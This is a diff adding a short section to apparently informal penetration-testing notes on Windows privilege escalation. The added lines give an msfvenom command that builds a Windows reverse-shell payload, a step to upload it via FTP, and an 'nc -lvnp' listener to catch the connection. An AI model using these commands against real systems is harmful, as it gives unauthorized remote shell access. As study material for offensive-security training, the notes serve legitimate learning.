@@ -128,6 +128,15 @@ Now we need to set out session to the seesion that we got from the background co
 We need to set out lhost and lport (we need to use a different port from which we used in the reverse shell).
 
 Then we can use run
+```
+# Windows manual Escalation
+```
+First we need to see if we can upload a file to a ftp server or something like that...
+Lets say that we can so we can use meterpreter with the next command:
+msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f (file extension) > (file name)
+We need to upload the file to the place that it can be uploaded to.
 
+Then we can use run the command ---> nc -lvnp $PORT
 
+We will get a connection without using meterpreter.
 ```
